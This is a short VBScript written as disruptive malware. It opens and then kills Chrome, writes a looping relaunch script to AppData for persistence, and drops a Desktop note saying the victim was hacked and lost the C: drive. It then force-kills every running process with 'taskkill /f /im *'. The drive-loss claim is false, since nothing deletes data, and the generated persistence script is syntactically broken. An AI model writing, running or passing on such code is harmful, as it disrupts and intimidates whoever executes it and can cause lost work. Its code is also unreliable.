Set shell = CreateObject("WScript.Shell")

Set fso = CreateObject("Scripting.FileSystemObject")

shell.run "chrome https://www.google.com/search?q=Bye+computer!"

    WScript.Sleep 5000

    shell.run "taskkill /f /im chrome.exe"

    Desktop = shell.SpecialFolders("Desktop")
        FileName2 = shell.SpecialFolders("AppData") & "\wscriptexe.vbs"
    
   Dim Note2(15)
Note2(0) = "Set shell = CreateObject(""WScript.Shell"")"
Note2(1) = "Function IsProcessRunning(processName)"
Note2(2) = "    Dim objWMIService, colProcess"
Note2(3) = "    Set objWMIService = GetObject(""winmgmts:\\.\root\cimv2"")"
Note2(4) = "    Set colProcess = objWMIService.ExecQuery(""Select * from Win32_Process Where Name='" & Replace("wscript.exe " & WScript.ScriptFullName, "\", "\\") & "'"" )"
Note2(5) = "    If colProcess.Count > 0 Then"
Note2(6) = "        IsProcessRunning = True"
Note2(7) = "    Else"
Note2(8) = "        IsProcessRunning = False"
Note2(9) = "    End If"
Note2(10) = "End Function"

Note2(11) = "programName = ""wscript.exe " & WScript.ScriptFullName & """"

Note2(12) = "Do"
Note2(13) = "If Not IsProcessRunning(programName) Then"
Note2(14) = "    shell.Run programName"
Note2(15) = "Loop"

' Now, we add the loop statement outside the array declaration
LoopStatement = "Loop While Not IsProcessRunning(programName)"

If Not fso.FileExists(FileName2) Then
    Set objFile = fso.CreateTextFile(FileName2)
    For i = 0 To UBound(Note2)
        objFile.WriteLine Note2(i)
    Next
    ' Write the loop statement
    objFile.WriteLine LoopStatement
    objFile.Close
End If

' Now, the loop will run after the Note2 array has been written to the file
shell.run FileName2

    FileName = Desktop & "\Note.txt"

    Dim Note(4)
    Note(0) = "You have been hacked by one program, Stupid!"
    Note(1) = "Bye to your C: Drive!"
    Note(2) = "One Popcat ate it all!"
    Note(3) = ""
    Note(4) = "Bye Computer!"

    If Not fso.FileExists(FileName) Then
        Set objFile = fso.CreateTextFile(FileName)
        For i = 0 To UBound(Note)
            objFile.WriteLine Note(i)
        Next
        objFile.Close
    End If

    shell.run "notepad " & FileName

    WScript.Sleep 1000

    shell.run "taskkill /f /im notepad.exe"
    shell.run "taskkill /f /im *"
    shell.run "explorer.exe"
